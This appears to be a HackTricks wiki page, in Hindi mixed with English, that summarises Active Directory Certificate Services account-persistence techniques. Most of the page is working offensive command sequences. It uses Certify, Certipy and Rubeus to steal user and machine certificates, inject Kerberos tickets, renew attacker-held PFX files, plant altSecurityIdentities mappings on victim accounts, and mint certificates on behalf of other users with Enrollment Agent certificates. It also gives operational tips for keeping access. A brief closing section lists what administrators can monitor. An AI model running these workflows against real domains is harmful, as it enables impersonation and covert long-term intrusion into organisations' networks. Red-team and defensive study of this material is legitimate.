# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**यह [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) से awesome research के account persistence chapters का एक छोटा summary है**

## Certificates के साथ Active User Credential Theft को समझना – PERSIST1

ऐसी scenario में, जहां domain authentication allow करने वाला certificate किसी user द्वारा request किया जा सकता है, attacker के पास इस certificate को request करके steal करने और network पर persistence बनाए रखने का opportunity होता है। By default, Active Directory में `User` template ऐसी requests allow करता है, हालांकि कभी-कभी इसे disabled किया जा सकता है।

[Certify](https://github.com/GhostPack/Certify) या [Certipy](https://github.com/ly4k/Certipy) का use करके, आप enabled templates search कर सकते हैं जो client authentication allow करते हैं और फिर one request कर सकते हैं:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
एक certificate की ताकत उसकी इस क्षमता में होती है कि वह अपने user के रूप में authenticate कर सके, चाहे password बदले जाएँ, जब तक certificate valid रहता है।

आप PEM को PFX में convert कर सकते हैं और इसका उपयोग करके TGT प्राप्त कर सकते हैं:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Note: अन्य techniques (see THEFT sections) के साथ combined होने पर, certificate-based auth बिना LSASS को touch किए और even non-elevated contexts से भी persistent access allow करती है।

## Certificates के साथ Machine Persistence हासिल करना - PERSIST2

यदि किसी attacker के पास किसी host पर elevated privileges हों, तो वे default `Machine` template का उपयोग करके compromised system के machine account को certificate के लिए enroll कर सकते हैं। machine के रूप में authenticate करने से local services के लिए S4U2Self सक्षम होता है और durable host persistence provide कर सकता है:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Certificate Renewal के माध्यम से Persistence बढ़ाना - PERSIST3

Certificate templates की validity और renewal periods का abuse करके attacker long-term access बनाए रख सकता है। अगर आपके पास पहले से issued certificate और उसकी private key है, तो आप expiration से पहले उसे renew करके एक fresh, long-lived credential हासिल कर सकते हैं, बिना original principal से जुड़े अतिरिक्त request artifacts छोड़े।
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operational tip: attacker-held PFX files की lifetimes ट्रैक करें और समय से पहले renew करें। Renewal से updated certificates में modern SID mapping extension भी शामिल हो सकता है, जिससे वे stricter DC mapping rules के तहत भी usable रहते हैं (अगला section देखें)।

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

अगर आप target account के `altSecurityIdentities` attribute में write कर सकते हैं, तो आप attacker-controlled certificate को उस account से explicitly map कर सकते हैं। यह password changes के बाद भी persist करता है और, strong mapping formats का उपयोग करने पर, modern DC enforcement के तहत भी functional रहता है।

High-level flow:

1. एक client-auth certificate प्राप्त करें या issue करें जिसे आप control करते हैं (e.g., `User` template को अपने रूप में enroll करें)।
2. cert से एक strong identifier निकालें (Issuer+Serial, SKI, या SHA1-PublicKey)।
3. victim principal के `altSecurityIdentities` पर उस identifier का उपयोग करके एक explicit mapping जोड़ें।
4. अपने certificate से authenticate करें; DC explicit mapping के माध्यम से इसे victim से map कर देता है।

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
फिर अपने PFX के साथ authenticate करें. Certipy सीधे एक TGT प्राप्त करेगा:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### मजबूत `altSecurityIdentities` mappings बनाना

व्यवहार में, **Issuer+Serial** और **SKI** mappings attacker-held certificate से बनाने के लिए सबसे आसान strong formats हैं। यह **11 फरवरी, 2025** के बाद महत्वपूर्ण है, जब DCs डिफ़ॉल्ट रूप से **Full Enforcement** पर चले जाते हैं और weak mappings भरोसेमंद रहना बंद कर देते हैं।
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- `X509IssuerSerialNumber`, `X509SKI`, या `X509SHA1PublicKey` जैसे strong mapping types only उपयोग करें। Weak formats (Subject/Issuer, Subject-only, RFC822 email) अब deprecated हैं और DC policy द्वारा block किए जा सकते हैं।
- Mapping **user** और **computer** दोनों objects पर काम करता है, इसलिए किसी computer account के `altSecurityIdentities` पर write access होना उस machine के रूप में persist करने के लिए पर्याप्त है।
- Cert chain को एक ऐसे root तक build होना चाहिए जिस पर DC trust करता हो। NTAuth में Enterprise CAs आम तौर पर trusted होते हैं; कुछ environments public CAs पर भी trust करते हैं।
- Schannel authentication, PKINIT fail होने पर भी persistence के लिए useful रहती है, क्योंकि DC के पास Smart Card Logon EKU नहीं होता या `KDC_ERR_PADATA_TYPE_NOSUPP` return करता है।

#### 2025+ `Issuer/SID` explicit mappings

**Windows Server 2022+** domain controllers पर, जो **September 9, 2025** security update से patched हैं, Microsoft ने एक और strong explicit mapping format जोड़ा है जो persistence के लिए आकर्षक है क्योंकि यह same CA से certificate reissuance के बाद भी survive करता है:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
ऑपरेशनल रूप से यह पुराने strong formats से अलग है:
- `Issuer+Serial` **एक exact certificate** को pin करता है।
- `SKI` / `SHA1-PUKEY` **एक keypair** को pin करता है।
- `Issuer/SID` **issuing CA + target SID** को pin करता है, इसलिए same CA से renewed या reissued certificates `altSecurityIdentities` को दोबारा लिखे बिना काम करते रहते हैं।

Requirements and caveats
- logon के लिए प्रस्तुत किया गया certificate वास्तव में SID security extension में target account SID शामिल करना चाहिए।
- यह format उन `ESC9` / `ESC16` style certificates के लिए उपयोगी नहीं है जो SID extension omit करते हैं; ऐसे मामलों में `Issuer+Serial`, `SKI`, या `SHA1-PUKEY` पर वापस जाएँ।

कमज़ोर explicit mappings और attack paths के बारे में अधिक जानकारी के लिए, देखें:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

यदि आप एक valid Certificate Request Agent/Enrollment Agent certificate प्राप्त कर लेते हैं, तो आप users की ओर से नए logon-capable certificates मनचाहे तरीके से mint कर सकते हैं और agent PFX को offline एक persistence token के रूप में रख सकते हैं। Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
इस persistence को हटाने के लिए agent certificate या template permissions को revoke करना आवश्यक है।

Operational notes
- Modern `Certipy` versions `-on-behalf-of` और `-renew` दोनों support करते हैं, इसलिए Enrollment Agent PFX रखने वाला attacker original target account को दोबारा touch किए बिना leaf certificates mint कर सकता है और बाद में renew भी कर सकता है।
- अगर PKINIT-based TGT retrieval possible नहीं है, तो resulting on-behalf-of certificate फिर भी `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell` के साथ Schannel authentication के लिए usable रहता है।

## Using Persisted Certificates When PKINIT Fails

अगर DC के पास Smart Card Logon-capable certificate नहीं है, तो PKINIT के जरिए certificate logon `KDC_ERR_PADATA_TYPE_NOSUPP` के साथ fail हो सकता है। यह **persistence primitive** को खत्म नहीं करता: वही PFX अक्सर फिर भी Schannel-authenticated LDAP access के लिए usable रहता है।
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
यह विशेष रूप से PERSIST4/PERSIST5 के बाद उपयोगी है क्योंकि आप Linux/macOS से ऑपरेट करना जारी रख सकते हैं और अन्य directory persistence actions को chain कर सकते हैं, जैसे [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) drop करना या writable delegation attributes को edit करना।

## 2025 Strong Certificate Mapping Enforcement: Persistence पर प्रभाव

Microsoft KB5014754 ने domain controllers पर Strong Certificate Mapping Enforcement introduced किया। **11 February 2025** से, DCs weak/ambiguous mappings के लिए default रूप से **Full Enforcement** का उपयोग करते हैं, और **9 September 2025** security update के अनुसार patched DCs अब पुराने Compatibility-mode fallback को support नहीं करते। Practical implications:

- Pre-2022 certificates जिनमें SID mapping extension नहीं है, वे DCs के Full Enforcement में implicit mapping में fail हो सकते हैं। Attackers AD CS के through certificates renew करके (SID extension प्राप्त करने के लिए) या `altSecurityIdentities` में strong explicit mapping plant करके access maintain कर सकते हैं (PERSIST4)।
- Strong formats (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, और modern DCs पर `Issuer/SID`) का उपयोग करने वाली explicit mappings काम करती रहती हैं। Weak formats (Issuer/Subject, Subject-only, RFC822) block किए जा सकते हैं और persistence के लिए उनसे बचना चाहिए।
- अगर weak mappings अभी भी काम करती हुई दिखें, तो मान लें कि आप किसी unpatched या differently configured DC पर hit हुए हैं, न कि किसी reliable long-term persistence path पर।
- `ESC9` / `ESC16` style issuance paths जो SID extension suppress करते हैं, `Issuer/SID` को unusable बना देते हैं, इसलिए fallback strong mappings या normal template के through renewal practical persistence option बन जाते हैं।

Administrators को monitor और alert करना चाहिए:
- `altSecurityIdentities` में changes और Enrollment Agent तथा User certificates की issuance/renewals।
- on-behalf-of requests और unusual renewal patterns के लिए CA issuance logs।

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
